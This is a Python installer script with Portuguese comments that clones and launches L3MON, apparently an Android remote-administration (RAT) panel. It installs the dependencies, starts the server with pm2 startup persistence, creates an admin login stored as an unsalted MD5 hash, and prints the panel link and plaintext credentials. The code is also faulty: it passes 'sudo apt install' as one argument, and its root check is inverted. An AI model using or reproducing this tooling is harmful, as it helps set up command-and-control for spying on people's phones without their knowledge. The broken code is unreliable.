#!/usr/bin/env python3

import os
import subprocess

# Verifica se o usuário é root ou não (ou seja, se está sendo executado com privilégios de administrador).
if os.getuid() == 0:
    # O usuário é root, definimos algumas variáveis para os comandos
    INSTALL_CMD = "sudo apt install"
    NODE_CMD = "sudo npm"
    PM2_CMD = "sudo pm2"
else:
    # O usuário não é root, definimos algumas variáveis para os comandos
    INSTALL_CMD = "apt install"
    NODE_CMD = "npm"
    PM2_CMD = "pm2"

# Verifica se o diretório do repositório já existe; se não, clona o repositório
if not os.path.exists("L3MON"):
    subprocess.run(["git", "clone", "https://github.com/efxtv/L3MON.git"])

# Move o script para dentro do diretório do repositório L3MON (exceto o próprio diretório do script)
script_dir = os.path.dirname(os.path.abspath(__file__))
l3mon_dir = os.path.join("L3MON", os.path.basename(script_dir))
if script_dir != l3mon_dir:
    os.rename(script_dir, l3mon_dir)

# Acessa o diretório do repositório clonado
os.chdir("L3MON")

# Instala as dependências
subprocess.run([INSTALL_CMD, "wget", "curl", "git", "npm", "nano", "nodejs", "openjdk-8-jdk", "openjdk-8-jre"])

# Instala dependências adicionais e inicia o aplicativo
subprocess.run([NODE_CMD, "install"])
subprocess.run([NODE_CMD, "audit", "fix"])
subprocess.run([NODE_CMD, "audit"])
subprocess.run([NODE_CMD, "install"])
subprocess.run([PM2_CMD, "start", "index.js"])
subprocess.run([PM2_CMD, "startup"])

# Obtém o nome de usuário do usuário
username = input("Digite o nome de usuário (username): ")

# Obtém a senha do usuário para gerar a hash MD5
senha = input("Digite a senha: ")
md5hash = subprocess.run(["echo", "-n", senha], capture_output=True, text=True)
md5hash = subprocess.run(["openssl", "md5"], input=md5hash.stdout.encode(), capture_output=True, text=True)
md5hash = md5hash.stdout.split(" ")[-1].strip()

# Cria o arquivo maindb.json
with open("maindb.json", "w") as f:
    f.write('''{
  "admin": {
    "username": "''' + username + '''",
    "password": "''' + md5hash + '''",
    "loginToken": "",
    "logs": [],
    "ipLog": []
  },
  "clients": []
}
''')

# Obtém o IP do sistema
ip = os.popen("hostname -I | awk '{print $1}'").read().strip()

# Gera o link
link = f"http://{ip}:22533"

print(f"Link gerado: {link}")
print(f"Credenciais: User:{username} Pass:{senha}")
